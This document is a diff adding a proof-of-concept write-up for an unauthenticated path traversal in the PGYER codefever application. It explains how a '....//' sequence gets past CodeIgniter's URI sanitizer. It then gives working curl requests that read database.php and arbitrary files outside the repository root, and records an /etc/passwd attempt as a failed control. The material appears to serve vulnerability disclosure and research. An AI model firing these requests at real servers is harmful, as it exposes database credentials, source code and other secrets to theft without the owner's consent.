@@ -1,0 +1,41 @@
+CODEFEVER-01 PoC — Unauthenticated arbitrary file read via /doc/ path traversal
+================================================================================
+Target: PGYER/codefever @ 0c35e60f006f9d558cc33a159baf110659351990 (CodeIgniter 2.1.1)
+Endpoint: GET /doc/<lang>/<path>  ->  application/controllers/doc.php::_detail()
+
+Root cause: _detail() builds $docFile = <root>/doc/<lang>/ . implode('/',
+array_slice(explode('/', $this->uri->uri_string), 2)) with no realpath/basename
+containment and echoes file_get_contents($docFile) into the doc view (L99).
+No authentication (Base::__construct never enforces login).
+
+Why literal '../' fails: CI 2.1.1 system/core/URI.php:222 runs
+str_replace(array('//','../'), '/', ...) which collapses literal dot-segments
+before uri_string is built.
+
+WORKING BYPASS — '....//' segments (str_replace pattern order re-forms '../'
+AFTER the sanitizer has run):
+    '....//' --pass('//'=>'/')--> '...../' --pass('../'=>'/')--> '../'
+
+[1] 2 hops - read a config file outside the web docroot:
+    curl --path-as-is 'http://<HOST>/doc/cn/....//....//application/config/database.php'
+    -> HTTP 200, raw database.php content embedded in the app's doc view
+       (div.doc-content wrapper present).
+
+[2] 6 hops - escape the repository root (arbitrary same-drive read):
+    curl --path-as-is 'http://<HOST>/doc/cn/....//....//....//....//....//....//<TARGET-FILE>'
+
+[3] Negative control - literal ../ payload does NOT fire:
+    curl --path-as-is 'http://<HOST>/doc/cn/../../../etc/passwd'
+    -> HTTP 302 (constructor redirect / CI segment collapse); no read.
+
+[4] Encoded variant NOT exploitable on this stack (CI 2.1.1 never
+    URL-decodes URI segments):
+    curl --path-as-is 'http://<HOST>/doc/cn/..%2f..%2fapplication%2fconfig%2fdatabase.php'
+    -> HTTP 302 to /doc/cn/ ; no read.
+
+Same root cause (not separately exercised): _assets() branch
+(doc.php:121-133) serves the same unsanitized $docFile when the basename
+matches /^\w{32}\.png$/.
+
+Impact: unauthenticated arbitrary file read on the web server's drive
+(source, configuration, secrets readable by the PHP user).
